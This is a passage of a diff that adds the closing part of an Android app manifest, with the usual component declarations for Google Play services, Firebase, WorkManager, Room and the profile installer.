+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <provider android:authorities="com.nest.craft.spark.firebaseinitprovider" android:directBootAware="true" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <service android:directBootAware="true" android:exported="false" android:name="androidx.room.MultiInstanceInvalidationService"/>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery">
+            <meta-data android:name="backend:com.google.android.datatransport.cct.CctBackendFactory" android:value="cct"/>
+        </service>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
